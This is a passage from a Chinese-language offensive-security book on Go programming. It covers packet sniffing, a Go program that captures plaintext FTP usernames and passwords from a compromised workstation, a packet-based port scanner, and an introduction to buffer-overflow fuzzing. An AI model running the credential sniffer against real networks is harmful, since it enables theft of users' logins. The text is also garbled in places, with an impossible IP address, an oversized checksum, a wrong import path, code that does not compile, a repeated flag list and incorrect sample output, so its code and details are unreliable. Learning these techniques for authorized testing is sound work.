
Checksum=16919

SrcIP=10.0.1.20 DstIP=204.799.197.203 Options=[..] Padding=[]

- Layer 3 (40 bytes) = TCP {Contents=[..40..] Payload=[] SrcPort=37314

DstPort=80(http) Seq=2821110856 Ack=0 DataOffset=10 FIN=false SYN=true

RST=false

PSH=false ACK=false URG=false ECE=false CWR=false NS=false

Window=29200

Checksum=402875 Urgent=Options=[..5..] Padding=[]

Listing 8-4: 导出到标准输出的数据包

虽然原始输出并不十分易读，但它确实包含了每一层数据的良好拆分。你现在可以使用工具函数，如 `packet.ApplicationLayer` 和 `packet.Data()`，来获取单个层或整个数据包的原始字节。当你将输出与 `hex.Dump()` 结合时，可以以更易读的格式显示内容。你可以自己尝试一下。

## 嗅探并显示明文用户凭据

现在，让我们在你之前创建的代码基础上继续。你将复刻其他工具提供的某些功能，用于嗅探并显示明文用户凭据。

大多数机构现在通过使用交换网络运行，数据直接在两个端点之间发送，而不是通过广播发送，这使得在企业环境中被动捕获流量变得困难。然而，当以下明文嗅探攻击与地址解析协议（ARP）投毒等技术结合用时非常有用（这种攻击可以强制端点在交换网络上与恶意设备通信），或者当你正秘密地嗅探来自受攻击的用户工作站的出站流量时。在这个示例中，我们假设你已经攻破了一个用户工作站，并为了保持代码简洁，仅关注捕获使用 FTP 的流量。

除了几处微小的改动外，列表 8-5 中的代码与列表 8-3 中的代码几乎完全相同。

```go
package main
import (
    "bytes"
    "fmt"
    "log"
    "github.com/google/gopacket"
    "github.com/google/google/pcap"
)

var (
	iface = "enp0s5"
	snaplen = int32(1600)
	promisc = false
	time = pcap.BlockForever
	filter = "tcp and dst port 21"
	devFound = false
)

func main() {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Panicln(err)
	}

	for _, device := range devices {
		if device.Name == iface {
			devFound = true
		}
	}

	if !devFound {
		log.Panicln("Device %s does not exist", iface)
	}

	handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
	if err != nil {
		log.Panicln(err)
	}
	defer handle.Close()

	if err := handle.SetBPFFilter(filter); err != nil {
		tlog.Panicln(err)
	}

	source := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range source.Packets() {
		appLayer := packet.ApplicationLayer()
		if appLayer == nil {
			continue
		}
		payload := appLayer.Payload()
		if bytes.Contains(payload, []byte("USER")) {
			fmt.Print(string(payload))
		} else if bytes.Contains(payload, []byte("PASS")) {
			fmt.Print(string(payload))
		}
	}
}
```

Listing 8-5: 捕获 FTP 认证凭据 (`ch-8/ftp/main.go`)

| Bit | 7 | 6 | 5 | 4 | 3 | 2 | 1 | 0 |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| Flag | CWR | ECE | URG | ACK | PSH | RST | SYN | FIN |

一旦你知道了你关心的标志位的位置，就可以创建一个检查这些标志位的过滤器。例如，你可以查找包含以下标志位的数据包，它们可能表示有一个正在监听的服务：

- ACK
- ACK
- ACK 和 PSH

由于你能够使用 `gopacket` 库捕获并过滤某些数据包，你可以构建一个程序，尝试连接到远程服务、嗅探数据包，并只显示与这些 TCP 头部通信数据包的服务。假设所有其他服务都因为 SYN 连接而错误地显示为“开放”。

## 构建 BPF 过滤器

你的 BPF 过滤器需要检查指示数据传输的特定标志位值。如果之前提到的标志位被开启，标志位字节具有以下值：

- ACK 和 FIN: 00010001 (0x11)
- ACK: 00010000 (0x10)
- ACK 和 PSH: 00011000 (0x18)

为了清晰起见，我们包含了二进制值的十六进制等效值，因为你将在过滤器中使用十六进制值。

总结，你需要检查 TCP 头部第 14 个字节（基于 0 的索引的偏移量为 13），仅过滤标志位为 0x11、0x10 或 0x18 的数据包。BPF 过滤器如下：

```go
tcp[13] == 0x11 or tcp[13] == 0x10 or tcp[13] == 0x18
```

太棒了。你有了过滤器。

## 编写端口扫描器

现在你将使用该过滤器构建一个程序，建立完整的 TCP 连接并检查三次握手之外的数据包，以查看是否传输了其他数据包，这表明实际服务正在监听。程序如列表 8-6 所示。为了简单起见，我们没有对代码进行效率优化。但是，你可以通过类似于我们在第 2 章中所做的优化来大幅改进此代码。

```go
var (
  snaplen = int32(320)
  promisc = true
  timeout = pcap.BlockForever
  filter = "tcp[13] == 0x10 or tcp[13] == 0x18"
  devFound = false
  results = make(map[string]int)
)
```

```go
func capture(iface, target string) {
  handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)
  if err != nil {
    log.Panic(err)
  }

  defer handle.Close()

  if err := handle.SetBPFFilter(filter); err != nil {
    log.Panic(err)
  }

  source := gopacket.NewPacketSource(handle, handle.LinkType())
  fmt.Println("Capturing packets")
  for packet := range source.Packets() {
    networkLayer := packet.NetworkLayer()
    if networkLayer == nil {
        continue
    }
    transportLayer := packet.TransportLayer()
    if transportLayer == nil {
        continue
    }

    srcHost := networkLayer.NetworkFlow().Src().String()
    srcPort := transportLayer.TransportFlow().Src().String()

    if srcHost != target {
        continue
    }
    results[srcPort] += 1
  }
}

func main() {
    if len(os.Args) != 4 {
        log.Fatalf("Usage: main.go <capture_interface> <target_ip> <port1,port2,port3")
    }

    devices, err := pcap.FindAllDevs()
    if err != nil {
        log.Panic(err)
    }

    iface := os.Args[1]
    for _, device := range devices {
        if device.Name == iface {
            devFound = true
        }
    }
    if !devFound {
        log.Panic("Device named %s does not exist", iface)
    }

    ip := os.Args[2]
    go capture(iface, ip)
    time.Sleep(1 * time.Second)

    ports, err := strings.Split(os.Args[3], ",")
    if err != nil {
        log.Println(err)
    }

    for _, port := range ports {
        target := fmt.Sprintf("%s:%s", ip, port)
        fmt.Println("Trying", target)
        c, err := net.DialTimeout("tcp", target, 1000*time.Millisecond)
        if err != nil {
            continue
        }
        c.Close()
    }
    time.Sleep(2 * time.Second)

    for port, confidence := range results {
        if confidence >= 1 {
            fmt.Printf("Port %s open: %d\n", port, confidence)
        }
    }
}
// 列表 8-6: 扫描和处理数据包 (`syn-flood/main.go`)
```

从大致来说，你的代码将按端口维护数据包计数，以表示你对端口开放的信心。你将使用过滤器仅选择设置了正确标志的数据包。匹配的数据包越多，你对服务在该端口监听的信心就越高。

你的代码从定义几个变量开始。这些变量包括你的过滤器和一个名为 `results` 的 map，你用它来跟踪端口的信心水平。你将目标端口作为键，维护匹配数据包的计数。接下来你定义了一个函数 `capture()`，它接受你正在测试的接口名称和目标 IP。该函数以相同的方式启动数据包捕获。但你必须使用不同的代码来处理每个数据包。你利用 `gopacket` 功能提取数据包的网络层和传输层。如果缺少任何一个层，都会忽略该数据包，因为下一步是检查数据包的源 IP 和端口；如果没有传输或网络层，你将没有这些信息。然后你确认数据包源是否匹配你的目标 IP 地址。如果不匹配，跳过后续处理。如果数据包的源 IP 和端口匹配，增加该端口的信心级别。在 `main()` 函数中，使用 goroutine 调用你的 `capture()` 函数。使用 goroutine 确保你的数据包捕获和处理逻辑并发运行而不阻塞。同时，你的 `main` 函数继续解析目标端口，逐一遍历并调用 `net.DialTimeout` 尝试对每个端口建立 TCP 连接。你的程序正在运行，积极监控这些连接，寻找指示服务正在监听的数据包。

在你尝试连接每个端口后，处理所有结果，只显示信心水平为 1 或更高的端口（意味着至少有一个数据包匹配你的端口过滤器）。代码包含了多次 `time.Sleep()` 调用，以确保你有足够的时间来设置嗅探器并处理数据包。

让我们看看程序的示例运行，如列表 8-7 所示。

```
$ go build -o syn-flood

sudo ./syn-flood enp0s5 10.100.100 80,443,8123,65530

Capturing packets

Trying 10.100.100:80

Trying 10.100.100:443

Trying 10.100.100:8123

Trying 10.100.100:65530

Port 80 open (confidence: 1)

Port 443 open (confidence: 1)
```
列表 8-7: 带有置信评分评分端口扫描结果

测试成功确定了端口 80 和 443 都是开放的。它还确认了端口 8123 和 65530 没有服务监听。（注意我们更改了示例中的 IP 地址以保护无辜。）

你可以通过多种方式改进代码。作为学习练习，我们挑战你添加以下增强：

- 从 `capture()` 函数中移除网络和传输层逻辑以及源检查。相反，在 BPF 过滤器中添加额外参数，以确保你只捕获来自目标 IP 和端口的数据包。
- 用并发方案替换顺序端口扫描逻辑，类似于我们在之前的章节中演示的方案。这将提高效率。
- 不要将代码限制在单个目标 IP，允许用户提供 IP 列表或网络块。

## 总结

我们完成了对数据包捕获的讨论，主要关注被动嗅探活动。在下一章中，我们将重点关注漏洞利用。

# 9 编写和移植漏洞代码

![](img/c6b1f5eba6708bab20a93514c9cb6f_333_0.png)

在之前的大部分章节中，你使用 Go 创建了网络攻击。你探索了原始 TCP、HTTP、DNS、SMB、数据库交互以及被动数据包捕获。

本章重点转变为识别和利用漏洞。首先，你将学习如何创建一个漏洞模糊器来发现应用程序的安全性点。然后你将学习如何将现有的漏洞移植到 Go。最后，我们将向你如何使用流行的工具创建 Go 友好的 shellcode。在章节结束时，你应该对如何使用 Go 发现缺陷有基本的理解，同时使用它来编写和交付各种有效负载。

## 创建模糊器

模糊测试（Fuzzing）是一种技术，通过向应用程序发送大量数据，试图强制应用程序产生异常行为。这种行为可能会揭示编码错误或安全缺陷，你之后可以利用它们。

对应用程序进行模糊测试（Fuzzing）也会产生意外的副作用，例如资源耗尽、内存损坏和服务中断。这些副作用中的某些一个对于漏洞猎人和利用程序开发人员完成工作来说是必要的，但对应用程序的稳定性是有害的。因此，在受控实验室环境中进行模糊测试至关重要。与我们在书中讨论的大多数技术一样，除非获得授权，否则不要对系统或应用程序进行模糊测试。

在本节中你将构建两个模糊器。第一个将检查输入的容量，尝试导致崩溃并识别缓冲区溢出。第二个模糊器将重放 HTTP 请求，循环可能的输入值以检测 SQL 注入。

## 缓冲区溢出

当用户提交的数据超过应用程序分配的内存空间时就会发生缓冲区溢出。例如，当应用程序期望接收5个字符时，用户可能会提交5000个字符。如果程序使用了错误的技术，可能会允许用户将多余的数据写入某些内存区域，这种“溢出”会破坏存储在相邻内存中的数据，允许恶意用户导致程序崩溃或更改其逻辑流。

缓冲区溢出对于从客户端接收数据的网络程序特别有影响。使用缓冲区溢出可以破坏服务器的可用性或可能实现远程代码执行。

## 缓冲区溢出的工作原理

创建缓冲区溢出的模糊测试通常涉及提交越来越长的输入，使得后续请求的长度比上一次长一个字符。使用 `A` 作为输入的构造示例如表 9-1 所示。通过向漏洞函数发送大量输入，最终将达到输入长度超过函数定义的缓冲区大小的点，这将损坏程序的控制元素，例如返回地址和指令指针。在此时，应用程序或系统将崩溃。

通过每次尝试发送增大的请求，你可以精确确定预期的输入，这对于后续利用应用程序非常重要。你可以检查崩溃或生成的核心转储（core dump），以更好地理解漏洞并尝试开发利用程序。我们在这里不会涉及调试器的使用和利用开发；而是专注于编写模糊器。

**表 9-1**: 缓冲区溢出输入值

| 尝试 | 输入值 |
|---|---|
| 1 | A |
| 2 | AA |
| 3 | AAA |
| 4 | AAAA |
| N | 重复 N 次 A |

如果你使用现代解释型语言进行过任何手动模糊测试，可能已经使用过构造来创建特定长度的字符串。例如，在解释器中运行的以下 Python 代码显示了创建25个字符的字符串是多么简单：

```python
>>> x = "A"*25
>>> x
'AAAAAAAAAAAAAAAA========='
```

遗憾的是，Go 没有这种方便构建任意长度字符串的构造。你需要老办法——使用循环——看起来像这样：

```go
var (
 n int
 s string
)

for n = 0; n < 25; n++ {
 s += "A"
}
```
